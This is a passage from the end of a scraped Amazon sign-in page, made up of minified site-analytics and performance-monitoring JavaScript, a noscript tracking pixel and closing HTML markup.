!b||0>=b.length?h(!1):l()}else h(!1)}var e=a.ue_ext||{};a.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=a.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;a.ue_err&&s&&(a.ue_err.errorHandlers||(a.ue_err.errorHandlers=[]),a.ue_err.errorHandlers.push({name:"ext",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||
d.push(h)}a.ext=d}}}));a.ue&&a.ue.isl?c():a.ue&&ue.attach&&ue.attach("load",q)})(document,window);





var ue_wtc_c = 3;
ue_csm.ue.exec(function(b,e){function l(){for(var a=0;a<f.length;a++)a:for(var d=s.replace(A,f[a])+g[f[a]]+t,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];n=0;k=p}function u(){B?l(q):l(C,q)}function v(a,m,c){r++;if(r>w)d.count&&1==r-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(D)&&a&&-1<a.constructor.toString().indexOf(x)&&m&&-1<
m.constructor.toString().indexOf(x)?(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+m),2E3>a.length+p?(2E3<k+a.length&&u(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,n||(n=e.setTimeout(u,E))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function F(){d.trigger&&
d.trigger.isStub&&d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&l(q),z=!0)}var t=":1234",s="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",E=b.wtt||1E4,p=s.length+t.length,w=b.mwtc||2E3,G=1===e.ue_wtc_c,B=3===e.ue_wtc_c,H=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",D="Object",d=b.ue,g={},f=[],k=p,n,z=!1,r=0,C=function(){return{send:function(a){if(H){var b=new e.XMLHttpRequest;
b.open("GET",a,!0);G&&(b.withCredentials=!0);b.send()}else throw"";}}}(),q=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),F(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "AuthenticationPortal", subPageType: "SignInPwdCollect", pageTypeId: ""}
    });
}
csa.plugin(function(e){var i="transitionStart",n="pageVisible",t="PageTiming",a="visibilitychange",o=e("Events",{producerId:"csa"}),r=(e.global.performance||{}).timing,d=["navigationStart","unloadEventStart","unloadEventEnd","redirectStart","redirectEnd","fetchStart","domainLookupStart","domainLookupEnd","connectStart","connectEnd","secureConnectionStart","requestStart","responseStart","responseEnd","domLoading","domInteractive","domContentLoadedEventStart","domContentLoadedEventEnd","domComplete","loadEventStart","loadEventEnd"],c=e.config,l=e.global.document||{},s=(r||{}).navigationStart,u=s,m={},g=0,v=0,f=c[t+".BatchInterval"]||3e3,p=0,S=!0;if(!c["KillSwitch."+t]){if(!r||null===s||s<=0||void 0===s)return e.error("Invalid navigation timing data: "+s);"boolean"!=typeof l.hidden&&"string"!=typeof l.visibilityState||!l.removeEventListener||((S=L())?(E(n,s),b()):e.on(l,a,function t(){(S=L())&&(u=e.time(),l.removeEventListener(a,t),E(n,u),E(i,u),b())})),e.once("$unload",h),e.once("$load",h),e.on("$beforePageTransition",y),e.on("$pageTransition",function(){u=e.time()}),e.register(t,{mark:E})}function E(t,n){null!=t&&(n=n||e.time(),t===i&&(u=n),m[t]=n,b(),e.emit("$timing:"+t,n))}function h(){!function(){if(p)return;for(var t=0;t<d.length;t++)r[d[t]]&&E(d[t],r[d[t]]);p=1}(),g=1,b(!0)}function b(t){g&&S&&!v&&(v=e.timeout(y,t?0:f))}function y(){0<Object.keys(m).length&&(o("log",{markers:function(t,n){var e={};for(var i in t)t.hasOwnProperty(i)&&(e[i]=Math.max(0,t[i]-n));return e}(m,u),markerTimestamps:function(t){for(var n in t)t.hasOwnProperty(n)&&(t[n]=Math.floor(t[n]));return t}(m),navigationStartTimestamp:u?new Date(u).toISOString():null,schemaId:"<ns>.PageLatency.5"},{ent:{page:["pageType","subPageType","requestId"]}}),m={}),v=0}function L(){return!l.hidden||"visible"===l.visibilityState}});csa.plugin(function(e){var m=!!e.config["LCP.elementDedup"],t=!1,n=e("PageTiming"),r=e.global.PerformanceObserver,a=e.global.performance;function i(){return a.timing.navigationStart}function o(){t||function(o){var l=new r(function(e){var t=e.getEntries();if(0!==t.length){var n=t[t.length-1];if(m&&""!==n.id&&n.element&&"IMG"===n.element.tagName){for(var r={},a=t[0],i=0;i<t.length;i++)t[i].id in r||(""!==t[i].id&&(r[t[i].id]=!0),a.startTime<t[i].startTime&&(a=t[i]));n=a}l.disconnect(),o({startTime:n.startTime,renderTime:n.renderTime,loadTime:n.loadTime})}});try{l.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}}(function(e){e&&(t=!0,n("mark","largestContentfulPaint",Math.floor(e.startTime+i())),e.renderTime&&n("mark","largestContentfulPaint.render",Math.floor(e.renderTime+i())),e.loadTime&&n("mark","largestContentfulPaint.load",Math.floor(e.loadTime+i())))})}r&&a&&a.timing&&(e.once("$unload",o),e.once("$load",o),e.register("LargestContentfulPaint",{}))});csa.plugin(function(r){var e=r("Metrics",{producerId:"csa"}),n=r.global.PerformanceObserver;n&&(n=new n(function(r){var t=r.getEntries();if(0===t.length||!t[0].processingStart||!t[0].startTime)return;!function(r){r=r||0,n.disconnect(),0<=r?e("recordMetric","firstInputDelay",r):e("recordMetric","firstInputDelay.invalid",1)}(t[0].processingStart-t[0].startTime)}),function(){try{n.observe({type:"first-input",buffered:!0})}catch(r){}}())});csa.plugin(function(d){var e="Metrics",r=d.config,u=r[e+".BatchInterval"]||3e3;function n(e){var r=e.producerId,n=e.logger,t=n||d("Events",{producerId:r}),i={},o=(e||{}).dimensions||{},c=0;if(!r&&!n)return d.error("Either a producer id or custom logger must be defined");function s(){Object.keys(i).length&&(t("log",{schemaId:e.schemaId||"<ns>.Metric.3",metrics:i,dimensions:o},e.logOptions||{ent:{page:["pageType","subPageType","requestId"]}}),i={}),c=0}this.recordMetric=function(e,r){i[e]=r,c=c||d.timeout(s,u)},d.on("$beforeunload",s),d.on("$beforePageTransition",s)}r["KillSwitch."+e]||(new n({producerId:"csa"}).recordMetric("baselineMetricEvent",1),d.register(e,{instance:function(e){return new n(e||{})}}))});csa.plugin(function(c){var e="Timers",r=(c.global.performance||{}).timing,u=(r||{}).navigationStart||c.time(),s=c.config[e+".BatchInterval"]||3e3;function n(e){var r=(e=e||{}).producerId,n=e.logger,o={},t=0,i=n||c("Events",{producerId:r});if(!r&&!n)return c.error("Either a producer id or custom logger must be defined");function a(){0<Object.keys(o).length&&(i("log",{markers:o,schemaId:e.schemaId||"<ns>.Timer.1"},e.logOptions),o={}),clearTimeout(t),t=0}this.mark=function(e,r){o[e]=(void 0===r?c.time():r)-u,t=t||c.timeout(a,s)},c.once("$beforeunload",a),c.once("$beforePageTransition",a)}r&&c.register(e,{instance:function(e){return new n(e||{})}})});csa.plugin(function(t){var e="takeRecords",i="disconnect",n="function",o="removeEventListener",c="click",a=t("Metrics",{producerId:"csa"}),r=t("PageTiming"),u=t.global,f=t.timeout,m=t.on,l=u.PerformanceObserver,s=0,d=!1,v=0,h=u.performance,y=u.document,g=null,p=!1;function T(){d||(d=!0,clearTimeout(g),typeof l[e]===n&&l[e](),typeof l[i]===n&&l[i](),a("recordMetric","documentCumulativeLayoutShift",s),r("mark","cumulativeLayoutShiftLastTimestamp",Math.floor(v+h.timing.navigationStart)))}l&&h&&h.timing&&y&&(l=new l(function(t){g&&clearTimeout(g);t.getEntries().forEach(function(t){t.hadRecentInput||(s+=t.value,v<t.startTime&&(v=t.startTime))}),g=f(T,5e3)}),function(){try{l.observe({type:"layout-shift",buffered:!0}),g=f(T,5e3)}catch(t){}}(),m(y,c,function t(e){p||(p=!0,a("recordMetric","documentCumulativeLayoutShiftToFirstInput",s),y[o](c,t))}),m(y,"visibilitychange",function(){"hidden"===y.visibilityState&&T()}),t.once("$unload",T))});csa.plugin(function(e){var t,n=e.global,r=n.PerformanceObserver,c=e("Metrics",{producerId:"csa"}),o=0,i=0,a=-1,l=n.Math,f=l.max,u=l.ceil;if(r){t=new r(function(e){e.getEntries().forEach(function(e){var t=e.duration;o+=t,i+=t,a=f(t,a)})});try{t.observe({type:"longtask",buffered:!0})}catch(e){}t=new r(function(e){0<e.getEntries().length&&(i=0,a=-1)});try{t.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}e.on("$unload",g),e.on("$beforePageTransition",g)}function g(){c("recordMetric","totalBlockingTime",u(i||0)),c("recordMetric","totalBlockingTimeInclLCP",u(o||0)),c("recordMetric","maxBlockingTime",u(a||0)),i=o=0,a=-1}});csa.plugin(function(r){var e="CacheDetection",o="csa-ctoken-",c=r.store,t=r.deleteStored,n=r.config,a=n[e+".RequestID"],i=n[e+".Callback"],s=n[e+".CDNCacheFix"],u=r.global,d=u.document||{},f=u.Date,l=r("Events"),p=r("Events",{producerId:"csa"});function v(e){try{var c=d.cookie.match(RegExp("(^| )"+e+"=([^;]+)"));return c&&c[2].trim()}catch(e){}}!function(){var e=function(){var e=v("cdn-rid");if(e)return{r:e,s:"cdn"}}()||function(){if(r.store(o+a))return{r:r.UUID().toUpperCase().replace(/-/g,"").slice(0,20),s:"device"}}()||{},c=e.r,n=e.s;if(!!c){var t=v("session-id");!function(e,c,n,t){l("setEntity",{page:{pageSource:"cache",requestId:e,cacheRequestId:a,cacheSource:t},session:{id:n}})}(c,0,t,n),s&&"device"!==n||p("log",{schemaId:"<ns>.CacheImpression.1"},{ent:"all"}),i&&i(c,t,n)}}(),c(o+a,f.now()+36e5),r.once("$load",function(){var n=f.now();t(function(e,c){return 0==e.indexOf(o)&&parseInt(c)<n})})});csa.plugin(function(u){var i,t="Content",e="MutationObserver",n="addedNodes",a="querySelectorAll",s="matches",r="getAttributeNames",o="getAttribute",f="dataset",c="widget",l="producerId",d={ent:{element:1,page:["pageType","subPageType","requestId"]}},h=5,g=u.config[t+".BubbleUp.SearchDepth"]||20,m="csaC",p=m+"Id",y={},v=u.config,b=v[t+".Selectors"]||[],E=v[t+".WhitelistedAttributes"]||{href:1,class:1},I=v[t+".EnableContentEntities"],w=u.global,C=w.document||{},A=C.documentElement,U=w.HTMLElement,k={},L=[],N=function(t,e,n,i){var r=this,o=u("Events",{producerId:t||"csa"});e.type=e.type||c,r.id=e.id,r.l=o,r.e=e,r.el=n,r.rt=i,r.dlo=d,r.log=function(t,e){o("log",t,e||d)},e.id&&o("setEntity",{element:e})},O=N.prototype;function D(t){var e=(t=t||{}).element,n=t.target;return e?function(t,e){var n;n=t instanceof U?B(t)||$(e[l],t,H,u.time()):k[t.id]||_(e[l],0,t,u.time());return n}(e,t):n?S(n):u.error("No element or target argument provided.")}function S(t){var e=function(t){var e=null,n=0;for(;t&&n<g;){if(n++,T(t,p)){e=t;break}t=t.parentElement}return e}(t);return e?B(e):new N("csa",{id:null},null,u.time())}function T(t,e){if(t&&t.dataset)return t.dataset[e]}function j(t,e,n){L.push({n:n,e:t,t:e}),x()}function q(){for(var t=u.time(),e=0;0<L.length;){var n=L.shift();if(y[n.n](n.e,n.t),++e%10==0&&u.time()-t>h)break}i=0,L.length&&x()}function x(){i=i||u.raf(q)}function M(t,e,n){return{n:t,e:e,t:n}}function $(t,e,n,i){var r=u.UUID(),o={id:r},c=S(e);return e[f][p]=r,n(o,e),c.id&&(o.parentId=c.id),_(t,e,o,i)}function _(t,e,n,i){I&&(n.schemaId="<ns>.ContentEntity.2"),n.id=n.id||u.UUID();var r=new N(t,n,e,i);return I&&r.log({schemaId:"<ns>.ContentRender.1",timestamp:i}),u.emit("$content.register",r),k[n.id]=r}function B(t){return k[(t[f]||{})[p]]}function H(t,e){r in e&&(function(n,i){Object.keys(n[f]).forEach(function(t){if(!t.indexOf(m)&&m.length<t.length){var e=function(t){return(t[0]||"").toLowerCase()+t.slice(1)}(t.slice(m.length));i[e]=n[f][t]}})}(e,t),function(e,n){(e[r]()||[]).forEach(function(t){t in E&&(n[t]=e[o](t))})}(e,t))}A&&C[a]&&w[e]&&(b.push({selector:"*[data-csa-c-type]",entity:H}),b.push({selector:".celwidget",entity:function(t,e){H(t,e),t.slotId=t.slotId||e[o]("cel_widget_id")||e.id,t.type=t.type||c}}),y[1]=function(t,e){t.forEach(function(t){t[n]&&t[n].constructor&&"NodeList"===t[n].constructor.name&&Array.prototype.forEach.call(t[n],function(t){L.unshift(M(2,t,e))})})},y[2]=function(o,c){a in o&&s in o&&b.forEach(function(t){for(var e=t.selector,n=o[s](e),i=o[a](e),r=i.length-1;0<=r;r--)L.unshift(M(3,{e:i[r],s:t},c));n&&L.unshift(M(3,{e:o,s:t},c))})},y[3]=function(t,e){var n=t.e;B(n)||$("csa",n,t.s.entity,e)},y[4]=function(){u.register(t,{instance:D})},new w[e](function(t){j(t,u.time(),1)}).observe(A,{childList:!0,subtree:!0}),j(A,u.time(),2),j(null,u.time(),4),u.on("$content.export",function(e){Object.keys(e).forEach(function(t){O[t]=e[t]})}))});csa.plugin(function(n){var i,t="ContentImpressions",e="KillSwitch.",o="IntersectionObserver",r="getAttribute",s="dataset",c="intersectionRatio",a="csaCId",m=1e3,l=n.global,f=n.config,u=f[e+t],g=f[e+t+".ContentViews"],v=((l.performance||{}).timing||{}).navigationStart||n.time(),d={};function h(t){t&&(t.v=1,function(t){t.vt=n.time(),t.el.log({schemaId:"<ns>.ContentView.3",timeToViewed:t.vt-t.el.rt,pageFirstPaintToElementViewed:t.vt-v})}(t))}function I(t){t&&!t.it&&(t.i=n.time()-t.is>m,function(t){t.it=n.time(),t.el.log({schemaId:"<ns>.ContentImpressed.2",timeToImpressed:t.it-t.el.rt,pageFirstPaintToElementImpressed:t.it-v})}(t))}!u&&l[o]&&(i=new l[o](function(t){t.forEach(function(t){var e=function(t){if(t&&t[r])return d[t[s][a]]}(t.target);if(e){var i=t.intersectionRect;t.isIntersecting&&0<i.width&&0<i.height&&(g||e.v||h(e),.5<=t[c]&&!e.is&&(e.is=n.time(),e.timer=n.timeout(function(){I(e)},m))),t[c]<.5&&!e.it&&e.timer&&(l.clearTimeout(e.timer),e.is=0,e.timer=0)}})},{threshold:[0,.5]}),n.on("$content.register",function(t){var e=t.el;e&&(d[t.id]={el:t,v:0,i:0,is:0,vt:0,it:0},i.observe(e))}))});csa.plugin(function(e){e.config["KillSwitch.ContentLatency"]||e.emit("$content.export",{mark:function(t,n){var o=this;o.t||(o.t=e("Timers",{logger:o.l,schemaId:"<ns>.ContentLatency.1",logOptions:o.dlo})),o.t("mark",t,n)}})});csa.plugin(function(d){var t,i="normal",s="reload",n="history",o="new-tab",e="ajax",a=1,r=2,c="lastActive",u="lastInteraction",l="used",f="csa-tabbed-browsing",p="visibilityState",g={"back-memory-cache":1,"tab-switch":1,"history-navigation-page-cache":1},v="<ns>.TabbedBrowsing.2",b="visible",m=d.global,y=d("Events",{producerId:"csa"}),I=m.location||{},h=m.document,T=m.JSON,w=((m.performance||{}).navigation||{}).type,z=d.store,P=d.on,S=d.storageSupport(),k=!1,x={},A={},C={},O={},$=!1,j=!1,q=!1;function B(i){try{return T.parse(z(f,void 0,{session:i})||"{}")||{}}catch(i){d.error('Could not parse storage value for key "'+f+'": '+i)}return{}}function E(i,t){z(f,T.stringify(t||{}),{session:i})}function J(i){var t=A.tid||i.id,n=x[c]||{};n.tid===t&&(n.pid=i.id),O={pid:i.id,tid:t,lastInteraction:A[u]||{},initialized:!0},C={lastActive:n,lastInteraction:x[u]||{},time:d.time()}}function N(i){var t=i===o,n=h.referrer,e=!(n&&n.length)||!~n.indexOf(I.origin||""),a=t&&e,r={type:i,toTabId:O.tid,toPageId:O.pid,transitTime:d.time()-x.time||null};a||function(i,t,n){var e=i===s,a=t?x[c]||{}:A,r=x[u]||{},d=A[u]||{},o=t?r:d;n.fromTabId=a.tid,n.fromPageId=a.pid,e||!o.id||o[l]||(n.interactionId=o.id||null,r.id===o.id&&(r[l]=!0),d.id===o.id&&(d[l]=!0))}(i,t,r),y("log",{navigation:r,schemaId:v},{ent:{page:["pageType","subPageType","requestId"]}})}function D(i){q=function(i){return i&&i in g}(i.transitionType),function(){x=B(!1),A=B(!0);var i=x[u],t=A[u],n=!1,e=!1;i&&t&&i.id===t.id&&i[l]!==t[l]&&(n=!i[l],e=!t[l],t[l]=i[l]=!0,n&&E(!1,x),e&&E(!0,A))}(),J(i),$=!0,function(i){var t,n;t=G(),n=H(),(t||n)&&J(i)}(i)}function F(){k&&!q?N(e):(k=!0,N(w===r||q?n:w===a?A.initialized?s:o:A.initialized?i:o))}function G(){return!(!$||!t)&&(A[u]={id:t.messageId,used:!(x[u]={id:t.messageId,used:!1})},!(t=null))}function H(){var i=!1;if(j=h[p]===b,$){var t=x[c]||{};i=function(i,t,n){var e=!1,a=i[c];return j?a&&a.tid===O.tid&&a[b]&&a.pid===n||(i[c]={visible:!0,pid:n,tid:t},e=!0):a&&a.tid===O.tid&&a[b]&&(e=!(a[b]=!1)),e}(x,A.tid||t.tid||O.tid,A.pid||t.pid||O.pid)}return i}S.local&&S.session&&T&&h&&p in h&&(P("$pageChange",function(i){D(i),F(),E(!1,C),E(!0,O),A=O,x=C},{buffered:1}),P("$content.interaction",function(i){t=i,G()&&(E(!1,x),E(!0,A))}),P(h,"visibilitychange",function(){H()&&E(!1,x)},{capture:!1,passive:!0}))});csa.plugin(function(c){var e=c("Metrics",{producerId:"csa"});c.on(c.global,"pageshow",function(c){c&&c.persisted&&e("recordMetric","bfCache",1)})});


}
/* ◬ */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:144-8202436-4876725:VSZ4ZGX2EWQ1W9SH2WX0$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DVSZ4ZGX2EWQ1W9SH2WX0:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 35168)</script>

<div id="a-white"></div><div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>